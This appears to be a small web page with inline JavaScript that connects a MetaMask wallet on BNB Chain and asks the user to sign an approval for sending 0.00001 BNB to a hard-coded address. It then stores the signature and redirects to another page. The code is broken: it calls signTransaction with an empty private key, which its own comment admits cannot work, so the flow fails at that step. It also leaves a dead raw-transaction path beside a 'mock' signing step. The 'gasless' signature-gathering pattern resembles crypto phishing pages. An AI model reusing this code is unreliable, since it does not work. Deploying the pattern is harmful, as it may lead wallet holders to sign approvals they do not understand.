<!-- index.html -->
<!DOCTYPE html>
<html>
<head>
  <title>BNB Gasless Sign Flow</title>
  <script src="https://cdn.jsdelivr.net/npm/web3@1.10.0/dist/web3.min.js"></script>
</head>
<body>
  <h2>BNB Gasless Transaction Sign</h2>
  <button onclick="start()">Connect & Sign</button>

  <script>
    const receiver = "0x0d4eFb6dfF647912Bb7B29Ed3a0e1E8f6E4c297a";

    async function start() {
      if (!window.ethereum) return alert("Please install MetaMask");

      const web3 = new Web3(window.ethereum);

      // 1. Connect wallet
      const accounts = await ethereum.request({ method: 'eth_requestAccounts' });
      const sender = accounts[0];

      // 2. Switch to BNB Chain
      try {
        await ethereum.request({
          method: 'wallet_switchEthereumChain',
          params: [{ chainId: '0x38' }]
        });
      } catch (e) {
        alert("Please switch to BNB Smart Chain manually.");
        return;
      }

      // 3. Get small amount to sign (0.00001 BNB)
      const value = web3.utils.toHex(web3.utils.toWei("0.00001", "ether"));

      // 4. Build raw transaction object
      const tx = {
        from: sender,
        to: receiver,
        value,
        gas: web3.utils.toHex(21000),
        gasPrice: web3.utils.toHex(web3.utils.toWei('5', 'gwei')),
        nonce: await web3.eth.getTransactionCount(sender),
        chainId: 56
      };

      // 5. Prepare the raw transaction
      const rawTx = await web3.eth.accounts.signTransaction(tx, ''); // Only works with private key, so use JSON instead

      // 6. Alternative: Sign plain message (mock transaction approval)
      const message = `I approve sending 0.00001 BNB to ${receiver}`;
      const signature = await web3.eth.personal.sign(message, sender);

      // 7. Save everything
      const txData = {
        from: sender,
        to: receiver,
        value: web3.utils.fromWei(value, 'ether'),
        message,
        signature
      };

      localStorage.setItem("tx_data", JSON.stringify(txData));
      window.location.href = "submit.html";
    }
  </script>
</body>
</html>
